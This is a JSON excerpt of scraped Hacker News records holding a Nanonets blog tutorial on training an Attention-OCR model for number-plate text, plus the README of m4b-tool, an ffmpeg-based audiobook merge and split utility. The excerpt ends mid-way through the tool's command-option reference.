        "url": "https://nanonets.com/blog/attention-ocr-for-text-recogntion/",
        "comments.comment_id": [20957135, 20958223],
        "comments.comment_author": ["bredren", "jlarocco"],
        "comments.comment_descendants": [3, 5],
        "comments.comment_time": [
          "2019-09-12T22:27:52Z",
          "2019-09-13T01:19:55Z"
        ],
        "comments.comment_text": [
          "I work on EasyALPR which I’m putting through Startup School.<p>One thing often missed in license plate reading is that the tech is really well solved now using an open source stack.<p>There is always room for improvement so I welcome new technological approaches like this.<p>However when thinking about license plate data, the real trouble is in what you do with the data, how you handle duplication, and create rules and interface to make the collection useful.",
          "Great article, misleading title.  It's not \"from scratch\" if it's using OpenCV, TensorFlow, and a web service to do all of the work.<p>Imagine, \"Bake Cookies From Scratch,\" and step one is remove the Pillsbury cookie dough from the freezer..."
        ],
        "id": "892d2f38-0bc8-4a2d-a3dd-2f50c8e3ace2",
        "url_text": "IntroductionOCR provides us with different ways to see an image, find and recognize the text in it. When we think about OCR, we inevitably think of lots of paperwork - bank cheques and legal documents, ID cards and street signs. In this blog post, we will try to predict the text present in number plate images.What we are dealing with is an optical character recognition library that leverages deep learning and attention mechanism to make predictions about what a particular character or word in an image is, if there is one at all. Lots of big words thrown there, so we'll take it step by step and explore the state of OCR technology and different approaches used for these tasks. You can always directly skip to the code section of the article or check the github repository if you are familiar with the big words above. Have a data extraction problem in mind? Head over to Nanonets and start building OCR models for free! OCR - Optical Character RecognitionOptical character recognition or OCR refers to a set of computer vision problems that require us to convert images of digital or hand-written text images to machine readable text in a form your computer can process, store and edit as a text file or as a part of a data entry and manipulation software. The images can include documents, invoices, legal forms, ID cards or OCR in the wild like reading street signs, shipping container numbers or vehicle number plates. People have tried solving the OCR problem with several conventional computer vision techniques like image filters, contour detection and image classification which performed well on narrow, template based datasets which did not vary much in their orientation, image quality, etc but to make our models robust to these variations so that a business can deploy their machine learning applications at scale, new methods have to be explored. There are a lot of services and ocr softwares that perform differently on different kinds of OCR tasks. If you are interested, here's a blog post about where these OCR APIs might fail and how can they improve.Deep Learning and OCRDeep learning approaches have improved over the last few years, reviving an interest in the OCR problem, where neural networks can be used to combine the tasks of localizing text in an image along with understanding what the text is. Using deep convolutional neural architectures and attention mechanisms and recurrent networks have gone a long way in this regard. One of these deep learning approaches is the basis of Attention - OCR, the library we are going to be using to predict the text in number plate images.Think of it like this. The overall pipeline for many architectures for OCR tasks follow this template - a convolutional network to extract image features as encoded vectors followed by a recurrent network that uses these encoded features to predict where each of the letters in the image text might be and what they are. Let's try to understand what's going on under the hood. Nanonets OCR API has many interesting use cases. Talk to a Nanonets AI expert to learn more. Attention MechanismsYou might be aware of RNNs or LSTMs, neural network architectures that predict output at each time step, providing us with sequence generation as we need for language. This breed of neural networks intended to learn patterns in sequential data by modifying their current state based on current input and previous states iteratively. But due to limitations on memory and issues like vanishing gradients, we found RNNs and LSTMs not able to really capture the influence of words farther away.Attention mechanism tries to fix this. It is a way to get your model learn long range dependencies in a sequence and has found several applications in natural language processing and machine translation. BERT attention visualisation - sourceIn a nutshell, attention is a feed-forward layer with trainable weights that help us capture the relationships between different elements of sequences. It works by using query, key and value matrices, passing the input embeddings through a series of operations and getting an encoded representation of our original input sequence. calculating encoded representations our input embeddings (x) with key, value, query matrices -sourceThere are flavors to attention mechanisms. They can be hard or soft attention depending on whether the entire image is available to the attention or only a patch. Having soft attention by laying each patch smoothly over the sequence makes it differentiable, but hurts the time taken to run computations. A better explanation can be found here.TransformersYou might have heard of BERT, GPT2 or more recently XLNet performing a little too well on language modelling and generation tasks. The secret sauce is the different ways of applying transformers. sourceIf you understand how attention works, it shouldn't take much effort to grasp how transformers work. In essence, the paper uses multi-headed attention, which is nothing but using several query, key and value matrices and training them independently, concatenating them and then extracting a useable matrix for our following network by using an additional set of weights. Another important addition is a positional embedding that encodes the time at which an element in a sequence appears. These positional embeddings are added to our input embeddings for the network to learn time dependencies better. This article is an amazing resource to learn about the mathematics behind self-attention and transformers.Visual AttentionThough attention and transformer networks evolved for applications in the NLP domain, they have been adapted for convolutional networks to replicate attention mechanisms of the human brain and how it processes vision. To learn more, check this link or this study. The fundamental behind this is to replicate how the human eye works.When you open your eyes to a new scene, some parts of the picture directly catch your 'attention'. You focus on those parts of the picture first, extract information from it and comprehend it. This information also guides your search for the next point of attention. This method of watering down an image into it's most important components is the basis of visual attention models. The process of finding the next attention point is seen as a sequential task on convolutional features extracted from the image. RAM - Recurrent Attention ModelThis paper approaches the problem of attention by using reinforcement learning to model how the human eye works. It defines a glimpse vector that extracts features of an image around a certain location. Several such glimpse vectors extracting features from a different sized crop of the image around a common centre are then resized and converted to a constant resolution. These glimpse vectors are flattened and passed through the glimpse network to obtain a vector representation based on visual attention.A) Glimpse sensor B) Glimpse network takes and image and location coordinates, crops extract different sized features around the location and resizes them for further processing C)These resized fixed length feature vectors are passed to an RNN which generates the next location for to pay attention to. sourceFollowing this, there is a Location Network which utilises an RNN to predict which part of the image our algorithm should pay attention to next. This predicted location becomes the next input for your glimpse network. This is a stochastic process which helps us balance exploration and exploitation while we are back-propagating our network to maximize our rewards. The back-propagation is done using the REINFORCE policy gradient on the log-likelihood of the attention score. DRAM - Deep Recurrent Attention ModelInstead of using a single RNN, DRAM uses two RNNs - a location RNN to predict the next glimpse location and another Classification RNN dedicated to predicting the class labels or guess which character is it we are looking at in the text. A context network is used to downsample image inputs for more generalisable RNN states. It also chooses to refer to the location network in RAM as Emission Network. The training is done using an accumulated reward and optimizing the sequence log-likelihood loss function using the REINFORCE policy gradient. The DRAM model - sourceCRNN - Convolutional Recurrent Neural NetworksCRNNs don't treat our OCR task as a reinforcement learning problem but as a machine learning problem with a custom loss. The loss used is called CTC loss - Connectionist Temporal Classification. The convolutional layers are used as feature extractors that pass these features to the recurrent layers - bi-directional LSTMs . These are followed by a transcription layer that uses a probabilistic approach to decode our LSTM outputs. Each frame generated by the LSTM is decoded into a character and these characters are fed into a final decoder/transcription layer which will output the final predicted sequence.source: https://arxiv.org/pdf/1507.05717.pdfSpatial Transformer NetworksSpatial Transformer Networks, introduced in this paper, augment input images by applying affine transformations so that the trained model is robust to variations in data. sourceThe network consists of a localisation net, a grid generator and a sampler. The localisation net takes an input image and gives us the parameters for the transformation we want to apply on it. The grid generator uses a desired output template, multiplies it with the parameters obtained from the localisation net and brings us the location of the point we want to apply the transformation at to get the desired result. A bilinear sampling kernel is finally used to generate our transformed feature maps. Attention OCRAttention-OCR is an OCR project available on tensorflow as an implementation of this paper and came into being as a way to solve the image captioning problem. It can be thought of as a CRNN followed by an attention decoder. https://arxiv.org/pdf/1609.04938v2.pdfFirst we use layers of convolutional networks to extract encoded image features. These extracted features are then encoded to strings and passed through a recurrent network for the attention mechanism to process. The attention mechanism used in the implementation is borrowed from the Seq2Seq machine translation model. We use this attention based decoder to finally predict the text in our image. Building your own Attention OCR modelWe will use attention-ocr to train a model on a set of images of number plates along with their labels - the text present in the number plates and the bounding box coordinates of those number plates. The dataset was acquired from here.The steps followed are summarized here:Gather annotated training data Get crops for each frame of each video where the number plates are. Generate tfrecords for all the cropped files.Place them in models/research/attention_ocr/python/datasets as required (in the FSNS dataset format). Follow this link or the following sections of this blog.Train the model using Attention OCR.Make prediction on your own cropped images. Or you can explore the Nanonets API where all you have to do is upload annotated images and let the platform handle the rest for you. More about this in the final section. This blog will run you through everything you need to train and make predictions using tensorflow attention-ocr. Full code available here.Getting training dataWe have images of number plates but we do not have the text in them or the bounding box numbers of the number plates in these images. Use an annotation tool to get your annotations and save them in a .csv file. Get cropsWe have stored our bounding box data as a .csv file. The .csv file has the following fields:filestext xminxmaxyminymax To crop the images and get only the cropped window we have to deal with different sized images. To do this we read the csv data in as a pandas dataframe and get our coordinates in such a way that we don't miss any information about the number plates while also maintaining a constant size of the crops. This will prove helpful when we are training our OCR model. Generate tfrecordsHaving stored our cropped images of equal sizes in a different directory, we can begin using those images to generate tfrecords that we will use to train our dataset. The script to generate tfrecords can be found in the repository shared above. These tfrecords along with the label mapping have to be stored in the tensorflow object detection API inside the following directory - DATA_PATH = 'models/research/attention_ocr/python/datasets/data/number_plates' The dataset has to be in the FSNS dataset format.For this, your test and train tfrecords along with the charset labels text file are placed inside a folder named 'fsns' inside the 'datasets' directory. you can change this to another folder and upload your tfrecord files and charset-labels.txt here. You'll have to change the path in multiple places accordingly. I have used a directory called 'number_plates' inside the datasets/data directory.Generate tf records by running the following script. Setting our Attention-OCR upOnce we have our tfrecords and charset labels stored in the required directory, we need to write a dataset config script that will help us split our data into train and test for the attention OCR training script to process. Make a python file and name it 'number_plates.py' and place it inside the following directory: 'models/research/attention_ocr/python/datasets' The contents of the number-plates.py can be found in the README.md file here. Also change the __init__.py file in the datasets directory to include the number_plates.py script. Train the modelMove into the following directory:models/research/attention_ocr Open the file named 'common_flags.py' and specify where you'd want to log your training. and run the following command on your terminal:# change this if you changed the dataset name in the # number_plates.py script or if you want to change the # number of epochs python train.py --dataset_name=number_plates --max_number_of_steps=3000 Evaluate the modelRun the following command from terminal. python eval.py --dataset_name='number_plates' Get predictionsNow from the same directory run the following command on your shell. python demo_inference.py --dataset_name=number_plates --batch_size=8, \\ --checkpoint='models/research/attention_ocr/number_plates_model_logs/model.ckpt-6000', \\ --image_path_pattern=/home/anuj/crops/%d.png We learned about attention mechanism, transformers, different ways visual attention is applied - RAM, DRAM and CRNNs. We learned about STNs. Finally we learned about the deep learning approach we used - Attention OCR. From a programming perspective, we learnt how to use attention OCR to train it on your own dataset and run inference using a trained model. The code can be found here and in my attention-ocr fork.There's of course a better, much simpler and more intuitive way to do this. OCR with NanonetsThe Nanonets OCR API allows you to build OCR models with ease. You can upload your data, annotate it, set the model to train and wait for getting predictions through a browser based UI without writing a single line of code, worrying about GPUs or finding the right architectures for your deep learning models. You can also acquire the json responses of each prediction to integrate it with your own systems and build machine learning powered apps built on state of the art algorithms and a strong infrastructure. Using the GUI: https://app.nanonets.com/You can also use the Nanonets-OCR API by following the steps below:Using NanoNets API Below, we will give you a step-by-step guide to training your own model using the Nanonets API, in 9 simple steps.Step 1: Clone the Repogit clone https://github.com/NanoNets/nanonets-ocr-sample-python cd nanonets-ocr-sample-python sudo pip install requests sudo pip install tqdmStep 2: Get your free API KeyGet your free API Key from https://app.nanonets.com/#/keysStep 3: Set the API key as an Environment Variableexport NANONETS_API_KEY=YOUR_API_KEY_GOES_HERE Step 4: Create a New Modelpython ./code/create-model.py Note: This generates a MODEL_ID that you need for the next stepStep 5: Add Model Id as Environment Variableexport NANONETS_MODEL_ID=YOUR_MODEL_ID Step 6: Upload the Training DataCollect the images of object you want to detect. Once you have dataset ready in folder images (image files), start uploading the dataset.python ./code/upload-training.py Step 7: Train ModelOnce the Images have been uploaded, begin training the Modelpython ./code/train-model.py Step 8: Get Model StateThe model takes ~30 minutes to train. You will get an email once the model is trained. In the meanwhile you check the state of the modelwatch -n 100 python ./code/model-state.py Step 9: Make PredictionOnce the model is trained. You can make predictions using the modelpython ./code/prediction.py PATH_TO_YOUR_IMAGE.jpg Have a data extraction problem in mind? Head over to Nanonets and start building OCR models for free! Further Reading OCR with Keras, TensorFlow, and Deep LearningTutorial : Building a custom OCR using YOLO and Tesseract Update #1: A lot of people while implementing the code were facing issues. Here's the most common one: Before you begin training, change the default checkpoint flag to None. Once you have trained the model, you can change the checkpoint path to your latest checkpoint in the common_flags.py file or run the inference script through command line and specify the checkpoint path explicitly.Update #2: The annotation tool used here is a custom tool built by us available at https://app.nanonets.comUpdate #3: Added more reading material about different approaches on using custom deep learning based OCR ",
        "_version_": 1718527426088140800
      },
      {
        "story_id": [19855350],
        "story_author": ["sandreas"],
        "story_descendants": [12],
        "story_score": [48],
        "story_time": ["2019-05-08T02:16:23Z"],
        "story_title": "Show HN: M4b-tool – a tool to merge, split and chapterize audiobooks",
        "search": [
          "Show HN: M4b-tool – a tool to merge, split and chapterize audiobooks",
          "https://github.com/sandreas/m4b-tool",
          "m4b-tool m4b-tool is a is a wrapper for ffmpeg and mp4v2 to merge, split or and manipulate audiobook files with chapters. Although m4b-tool is designed to handle m4b files, nearly all audio formats should be supported, e.g. mp3, aac, ogg, alac and flac. Important Note Unfortunately I am pretty busy at the moment, so m4b-tool 0.4.2 is very old. Since it is not planned to release a newer version without having complete documentation, there is only the latest pre-release getting bug fixes. It is already pretty stable, so if you are experiencing bugs with v0.4.2, please try the latest pre-release, if it has been already fixed there. Thank you, sandreas https://pilabor.com Features merge a set of audio files (e.g. MP3 or AAC) into a single m4b file split a single m4b file into several output files by chapters or a flac encoded album into single tracks via cue sheet Add or adjust chapters for an existing m4b file via silence detection or musicbrainz TL;DR - examples for the most common tasks Merge multiple files merge all audio files in directory data/my-audio-book into file data/merged.m4b (tags are retained and data/my-audio-book/cover.jpg and data/my-audio-book/description.txt are embedded, if available) m4b-tool merge \"data/my-audio-book/\" --output-file=\"data/merged.m4b\" Split one file by chapters split one big m4b file by chapters into multiple mp3 files at data/my-audio-book_splitted/ (tags are retained, data/my-audio-book_splitted/cover.jpg is created, if m4b contains a cover) m4b-tool split --audio-format mp3 --audio-bitrate 96k --audio-channels 1 --audio-samplerate 22050 \"data/my-audio-book.m4b\" Chapters adjustment of a file via silence detection chapters can try to adjust existing chapters of an m4b by silence detection m4b-tool chapters --adjust-by-silence -o \"data/destination-with-adjusted-chapters.m4b\" \"data/source-with-misplaced-chapters.m4b\" Best practices Since the most used subcommand of m4b-tool seems to be merge, lets talk about best practice... Step 0 - Take a look at the docker image Unfortunately m4b-tool has many dependencies. Not only one-liners, if you would like to get the best quality and tagging support, many dependencies have to be compiled manually with extra options. Thats why you should take a look at the docker image, which comes with all the bells and whistles of top audio quality, top tagging support and easy installation and has almost no disadvantages. Note: If you are on windows, it might be difficult to make it work Step 1 - Organizing your audiobooks in directories When merging audiobooks, you should prepare them - the following directory structure helps a lot, even if you only merge one single audiobook: input/<main genre>/<author>/<title> or if it is a series input/<main genre>/<author>/<series>/<series-part> - <title> Examples: input/Fantasy/J.K. Rowling/Quidditch Through the Ages/ input/Fantasy/J.K. Rowling/Harry Potter/1 - Harry Potter and the Philosopher's Stone/ Note: If your audiobook title contains invalid path characters like /, just replace them with a dash -. Step 2 - add cover and a description Now, because you almost always want a cover and a description for your audiobook, you should add the following files in the main directory: cover.jpg description.txt (Be sure to use UTF-8 text file encoding for the contents) Examples: input/Fantasy/J.K. Rowling/Quidditch Through the Ages/cover.jpg input/Fantasy/J.K. Rowling/Quidditch Through the Ages/description.txt Note: m4b-tool will find and embed these files automatically but does not fail, if they are not present Step 3 - chapters Chapters are nice to add waypoints for your audiobook. They help to remember the last position and improve the experience in general. fixed chapters If you would like to adjust chapters manually, you can add a chapters.txt (same location as cover.jpg) with following contents (<chapter-start> <chapter-title>): 00:00:00.000 Intro 00:04:19.153 This is 00:09:24.078 A way to add 00:14:34.500 Chapters manually by tag If your input files are tagged, these tags will be used to create the chapter metadata by its title. So if you tag your input files with valid chapter names as track title, this will result in a nice and clean m4b-file with valid chapter names. by length Another great feature since m4b-tool v.0.4.0 is the --max-chapter-length parameter. Often the individual input files are too big which results in chapters with a very long duration. This can be annoying, if you would like to jump to a certain point, since you have to rewind or fast-forward and hold the button for a long time, instead of just tipping previous or next a few times. To automatically add sub-chapters, you could provide: --max-chapter-length=300,900 This will cause m4b-tool Trying to preserve original chapters as long as they are not longer than 15 minutes (900 seconds) If a track is longer than 15 minutes Perform a silence detection and try to add sub-chapters at every silence between 5 minutes (300 seconds) and 15 minutes (900 seconds) If no silence is detected, add a hard cut sub-chapter every 5 minutes Sub-chapters are named like the original and get an additional index. This is a nice way to keep the real names but not having chapters with a too long duration. Step 4 (optional) - for iPod owners If you own an iPod, there might be a problem with too long audiobooks, since iPods only support 32bit sampling rates. If your audiobook is longer than 27 hours with 22050Hz sampling rate, you could provide --adjust-for-ipod, to automatically downsample your audiobook, which results in lower quality, but at least its working on your good old iPod... Step 5 (optional) - more cpu cores, faster conversion m4b-tool supports multiple conversion tasks in parallel with the --jobs parameter (e.g. --jobs=2). If you have to convert more than one file, which is the common case, you nearly double the merge speed by providing the --jobs=2 parameter (or quadruplicate with --jobs=4, if you have a quad core system, etc.). Don't provide a number higher than the number of cores on your system - this will slow down the merge... Note: If you run the conversion on all your cores, it will result in almost 100% CPU usage, which may lead to slower system performance Step 6 - Use the --batch-pattern feature In m4b-tool v.0.4.0 the --batch-pattern feature was added. It can be used to batch-convert multiple audiobooks at once, but also to just convert one single audiobook - because you can create tags from an existing directory structure. Hint: The output-file parameter has to be a directory, when using --batch-pattern. Even multiple --batch-pattern parameters are supported, while the first match will be used first. So if you created the directory structure as described above, the final command to merge input/Fantasy/Harry Potter/1 - Harry Potter and the Philosopher's Stone/ to output/Fantasy/Harry Potter/1 - Harry Potter and the Philosopher's Stone.m4b would look like this: m4b-tool merge -v --jobs=2 --output-file=\"output/\" --max-chapter-length=300,900 --adjust-for-ipod --batch-pattern=\"input/%g/%a/%s/%p - %n/\" --batch-pattern=\"input/%g/%a/%n/\" \"input/\" In --batch-pattern mode, existing files are skipped by default Result If you performed the above steps with the docker image or installed and compiled all dependencies, you should get the following result: Top quality audio by using libfdk_aac encoder Series and single audiobooks have valid tags for genre, author, title, sorttitle, etc. from --batch-pattern usage If the files cover.jpg and description.txt exist in the main directories, a cover, a description and a longdesc are embedded If you tagged the input files, real chapter names should appear in your player No more chapters longer than 15 minutes Working iPod versions for audiobooks longer than 27 hours Installation Docker To use docker with m4b-tool, you first have to build a custom image located in the docker directory. Since this image is compiling every third party library from scratch to get the best possible audio quality, it can take a long time for the first build. Note: You should know that build does not mean that m4b-tool is being compiled from source. That indeed is strange, but unlike other projects, the m4b-tool docker image only downloads the latest binary release unless you do some extra work (see below). # clone m4b-tool repository git clone https://github.com/sandreas/m4b-tool.git # change directory cd m4b-tool # build docker image - this will take a while docker build . -t m4b-tool # create an alias for m4b-tool running docker alias m4b-tool='docker run -it --rm -u $(id -u):$(id -g) -v \"$(pwd)\":/mnt m4b-tool' # testing the command m4b-tool --version Note: If you use the alias above, keep in mind that you cannot use absolute paths (e.g. /tmp/data/audiobooks/harry potter 1) or symlinks. You must change into the directory and use relative paths (e.g. cd /tmp/data && m4b-tool merge \"audiobooks/harry potter 1\" --output-file harry.m4b) Dockerize a Pre-Release or an older release version To build a docker container using a Pre-Release or an older m4b-tool release, it is required to provide an extra parameter for downloading a specific version into the image, e.g. for v.0.4.1: docker build . --build-arg M4B_TOOL_DOWNLOAD_LINK=https://github.com/sandreas/m4b-tool/releases/download/v.0.4.1/m4b-tool.tar.gz -t m4b-tool Note: You could also just edit the according variable in the Dockerfile. Dockerize a custom build, that is not available via download link Developers or experts might want to run a complete custom build of m4b-tool or build the code themselves (e.g. if you forked the repository and applied some patches). If that is the case, you can store the custom build to dist/m4b-tool.phar relative to the Dockerfile and then do a default build. # dist/m4b-tool.phar is available docker build . -t m4b-tool After this the custom build should be integrated into the docker image. MacOS On MacOS you may use the awesome package manager brew to install m4b-tool. Recommended: High audio quality, sort tagging Getting best audio quality requires some additional effort. You have to recompile ffmpeg with the non-free libfdk_aac codec. This requires uninstalling the default ffmpeg package if installed, since brew dropped the possibility for extra options. There is no official ffmpeg-with-options repository, but a pretty decent tap, that you could use to save time. # FIRST INSTALL ONLY: if not already done, remove existing ffmpeg with default audio quality options # check for ffmpeg with libfdk and uninstall if libfdk is not already available [ -x \"$(which ffmpeg)\" ] && (ffmpeg -hide_banner -codecs 2>&1 | grep libfdk || brew uninstall ffmpeg) # tap required repositories brew tap sandreas/tap brew tap homebrew-ffmpeg/ffmpeg # check available ffmpeg options and which you would like to use brew options homebrew-ffmpeg/ffmpeg/ffmpeg # install ffmpeg with at least libfdk_aac for best audio quality brew install homebrew-ffmpeg/ffmpeg/ffmpeg --with-fdk-aac # install m4b-tool brew install sandreas/tap/m4b-tool # check installed m4b-tool version m4b-tool --version Stick to defaults (acceptable audio quality, no sort tagging) If the above did not work for you or you would just to checkout m4b-tool before using it in production, you might want to try the quick and easy way. It will work, but you get lower audio quality and there is no support for sort tagging. # tap m4b-tool repository brew tap sandreas/tap # install dependencies brew install ffmpeg fdk-aac-encoder mp4v2 # install m4b-tool with acceptable audio quality and no sort tagging brew install --ignore-dependencies sandreas/tap/m4b-tool Ubuntu # install all dependencies sudo apt install ffmpeg mp4v2-utils fdkaac php-cli php-intl php-json php-mbstring php-xml # install / upgrade m4b-tool sudo wget https://github.com/sandreas/m4b-tool/releases/download/v.0.4.2/m4b-tool.phar -O /usr/local/bin/m4b-tool && sudo chmod +x /usr/local/bin/m4b-tool # check installed m4b-tool version m4b-tool --version Note: If you would like to get the best possible audio quality, you have to compile ffmpeg with the high quality encoder fdk-aac (--enable-libfdk_aac) - see https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu for a step-by-step guide to compile ffmpeg. Manual installation (only recommended on Windows systems) m4b-tool is written in PHP and uses ffmpeg, mp4v2 and optionally fdkaac for high efficiency codecs to perform conversions. Therefore you will need the following tools in your %PATH%: php >= 7.1 with mbstring extension enabled (https://php.net) ffmpeg (https://www.ffmpeg.org) mp4v2 (mp4chaps, mp4art, etc. https://github.com/sandreas/m4b-tool/releases/download/v0.2/mp4v2-windows.zip) fdkaac (optional, only if you need high efficiency for low bitrates <= 32k, http://wlc.io/2015/06/20/fdk-aac/ - caution: not official!) To check the dependencies, running following commands via command line should show similar output: $ php -v Copyright (c) 1997-2018 The PHP Group [...] $ ffmpeg -version ffmpeg version 4.1.1 Copyright (c) 2000-2019 the FFmpeg developers [...] $ mp4chaps --version mp4chaps - MP4v2 2.0.0 $ fdkaac fdkaac 1.0.0 [...] If you are sure, all dependencies are installed, the next step is to download the latest release of m4b-tool from https://github.com/sandreas/m4b-tool/releases Depending on the operating system, you can rename m4b-tool.phar to m4b-tool and run m4b-tool --version directly from the command line. If you are not sure, you can always use the command php m4b-tool.phar --version to check if the installation was successful. This should work on every system. If you would like to use the latest source code with all new features and fixes, you could also build from source. The current build might be in unstable and should only be used for testing purposes or if you need a specific feature that has not been released. Custom mp4v2 for accurate sorting order Most audiobooks are not released in alphabetical order. A prominent example is Harry Potter. So if you have all the Harry Potter audiobooks, it depends on your player, but probably they are not listed in the correct order... let's see, what the alphabetical order would be: Harry Potter and the Chamber of Secrets (Part 2) Harry Potter and the Philosopher's Stone (Part 1) Harry Potter and the Prisoner of Azkaban (Part 3) And the correct order would have been: Harry Potter and the Philosopher's Stone (Part 1) Harry Potter and the Chamber of Secrets (Part 2) Harry Potter and the Prisoner of Azkaban (Part 3) Well, there is a solution for this. You have to tag the audiobook with a custom sortname and / or sortalbum. If your player supports these tags, the order is now correct, even when the title is still the original title. To achieve this, i had to build a custom version of mp4v2 (more accurate mp4tags), to add options for these tags and add the pseudo tags --series and --series-part. So if you do the following: m4b-tool merge --name=\"Harry Potter and the Chamber of Secrets\" --series=\"Harry Potter\" --series-part=\"2\" --output-file=\"output/Harry Potter and the Chamber of Secrets.m4b\" \"input/Harry Potter and the Chamber of Secrets\" It would result in: Name: Harry Potter and the Chamber of Secrets Sortname: Harry Potter 2 - Harry Potter and the Chamber of Secrets Install custom mp4v2 In the docker image, the custom version is already installed git clone https://github.com/sandreas/mp4v2 cd mp4v2 ./configure make && sudo make install About audio quality In m4b-tool all audio conversions are performed with ffmpeg resulting in pretty descent audio quality using its free encoders. However, best quality takes some extra effort, so if you are using the free encoders, m4b-tool might show the following hint: Your ffmpeg version cannot produce top quality aac using encoder aac instead of libfdk_aac That's not really a problem, because the difference between the aac and libfdk_aac encoder is hardly noticeable in most cases. But to overcome the hint and get the best audio quality possible, you have to use a non-free encoder, that is not integrated in ffmpeg by default (licensing reasons). Depending on the operating system you are using, installing the non-free encoder may require a little extra skills, effort and time (see the notes for your operating system above). You have to decide, if it is worth the additional effort for getting the slightly better quality. If you are using the docker image, you should get the best quality by default. If you are using very low bitrates (<= 32k), you could also use high efficiency profiles to further improve audio quality (e.g. --audio-profile=aac_he for mono). Unfortunately, ffmpeg's high efficiency implementation produces audio files, that are incompatible with many players (including iTunes). To produce high efficiency files, that are compatible with at least most common players, you will need to install fdkaac for now. More Details: https://github.com/sandreas/m4b-tool/issues/19 https://trac.ffmpeg.org/wiki/Encode/AAC https://trac.ffmpeg.org/wiki/Encode/HighQualityAudio Submitting issues You think there is an issue with m4b-tool? First take a look at the Known Issues below. If this does not help, please provide the following information when adding an issue: the operating system you use the exact command, that you tried, e.g. m4b-tool merge my-audio-book/ --output-file merged.m4b the error message, that occured or the circumstances, e.g. the resulting file merged.m4b is only 5kb other relevant information, e.g. sample files if needed Example: Title: m4b-tool does not embed covers If i run m4b-tool with a folder containing a cover.png, it does not embed the cover and shows an error message. OS: Ubuntu 16.04 LTS Command: `m4b-tool merge my-audio-book/ ---output-file merged.m4b` Error: Cannot embed cover, cover is not a valid image file Attached files: cover.png Known issues If you are getting PHP Exceptions, it is a configuration issue with PHP in most cases. If are not familiar with PHP configuration, you could follow these instructions, to fix a few known issues: Exception Charset not supported [Exception] charset windows-1252 is not supported - use one of these instead: utf-8 This mostly happens on windows, because the mbstring-Extension is used to internally convert charsets, so that special chars like german umlauts are supported on every platform. To fix this, you need to enable the mbstring-extension: Run php --ini on the command line: C:\\>php --ini ... Loaded Configuration File: C:\\Program Files\\php\\php.ini Open the configuration file (e.g. C:\\Program Files\\php\\php.ini) in a text editor and search for extension=. On Windows there should be an item like this: ;extension=php_mbstring.dll remove the ; to enable the extension: extension=php_mbstring.dll Now everything should work as expected. m4b-tool commands The following list contains all possible commands including merge, split and chapters accompanied by the reference of parameters available in every command. merge With m4b-tool you can merge a set of audio files to one single m4b audiobook file. Example: m4b-tool merge \"data/my-audio-book\" --output-file=\"data/my-audio-book.m4b\" This merges all Audio-Files in folder data/my-audio-book into my-audio-book.m4b, using the tag-title of every file for generating chapters. If there is a file data/my-audio-book/cover.jpg, it will be used as cover for the resulting m4b file. Note: If you use untagged audio files, you could provide a musicbrainz id to get the correct chapter names, see command chapter for more info. Reference For all options, see m4b-tool merge --help: Description: Merges a set of files to one single file Usage: merge [options] [--] <input> [<more-input-files>...] Arguments: input Input file or folder more-input-files Other Input files or folders Options: --logfile[=LOGFILE] file to log all output [default: \"\"] --debug enable debug mode - sets verbosity to debug, logfile to m4b-tool.log and temporary encoded files are not deleted -f, --force force overwrite of existing files --no-cache clear cache completely before doing anything --ffmpeg-threads[=FFMPEG-THREADS] specify -threads parameter for ffmpeg - you should also consider --jobs when merge is used [default: \"\"] --platform-charset[=PLATFORM-CHARSET] Convert from this filesystem charset to utf-8, when tagging files (e.g. Windows-1252, mainly used on Windows Systems) [default: \"\"] --ffmpeg-param[=FFMPEG-PARAM] Add argument to every ffmpeg call, append after all other ffmpeg parameters (e.g. --ffmpeg-param=\"-max_muxing_queue_size\" --ffmpeg-param=\"1000\" for ffmpeg [...] -max_muxing_queue_size 1000) (multiple values allowed) -a, --silence-min-length[=SILENCE-MIN-LENGTH] silence minimum length in milliseconds [default: 1750] -b, --silence-max-length[=SILENCE-MAX-LENGTH] silence maximum length in milliseconds [default: 0] --max-chapter-length[=MAX-CHAPTER-LENGTH] maximum chapter length in seconds - its also possible to provide a desired chapter length in form of 300,900 where 300 is desired and 900 is max - if the max chapter length is exceeded, the chapter is placed on the first silence between desired and max chapter length [default: \"0\"] --name[=NAME] custom name, otherwise the existing metadata will be used --sortname[=SORTNAME] custom sortname, that is used only for sorting --album[=ALBUM] custom album, otherwise the existing metadata for name will be used --sortalbum[=SORTALBUM] custom sortalbum, that is used only for sorting --artist[=ARTIST] custom artist, otherwise the existing metadata will be used --sortartist[=SORTARTIST] custom sortartist, that is used only for sorting --genre[=GENRE] custom genre, otherwise the existing metadata will be used --writer[=WRITER] custom writer, otherwise the existing metadata will be used --albumartist[=ALBUMARTIST] custom albumartist, otherwise the existing metadata will be used --year[=YEAR] custom year, otherwise the existing metadata will be used --description[=DESCRIPTION] custom short description, otherwise the existing metadata will be used --longdesc[=LONGDESC] custom long description, otherwise the existing metadata will be used --comment[=COMMENT] custom comment, otherwise the existing metadata will be used --copyright[=COPYRIGHT] custom copyright, otherwise the existing metadata will be used --encoded-by[=ENCODED-BY] custom encoded-by, otherwise the existing metadata will be used --cover[=COVER] custom cover, otherwise the existing metadata will be used --skip-cover skip extracting and embedding covers --series[=SERIES] custom series, this pseudo tag will be used to auto create sort order (e.g. Harry Potter or The Kingkiller Chronicles) --series-part[=SERIES-PART] custom series part, this pseudo tag will be used to auto create sort order (e.g. 1 or 2.5) --audio-format[=AUDIO-FORMAT] output format, that ffmpeg will use to create files [default: \"m4b\"] --audio-channels[=AUDIO-CHANNELS] audio channels, e.g. 1, 2 [default: \"\"] --audio-bitrate[=AUDIO-BITRATE] audio bitrate, e.g. 64k, 128k, ... [default: \"\"] --audio-samplerate[=AUDIO-SAMPLERATE] audio samplerate, e.g. 22050, 44100, ... [default: \"\"] --audio-codec[=AUDIO-CODEC] audio codec, e.g. libmp3lame, aac, ... [default: \"\"] --audio-profile[=AUDIO-PROFILE] audio profile, when using extra low bitrate - valid values: aac_he, aac_he_v2 [default: \"\"] --adjust-for-ipod auto adjust bitrate and sampling rate for ipod, if track is too long (may result in low audio quality) --fix-mime-type try to fix MIME-type (e.g. from video/mp4 to audio/mp4) - this is needed for some players to prevent an empty video window -o, --output-file=OUTPUT-FILE output file --include-extensions[=INCLUDE-EXTENSIONS] comma separated list of file extensions to include (others are skipped) [default: \"aac,alac,flac,m4a,m4b,mp3,oga,ogg,wav,wma,mp4\"] -m, --musicbrainz-id=MUSICBRAINZ-ID musicbrainz id so load chapters from --no-conversion skip conversion (destination file uses same encoding as source - all encoding specific options will be ignored) --batch-pattern[=BATCH-PATTERN] multiple batch patterns that can be used to merge all audio books in a directory matching the 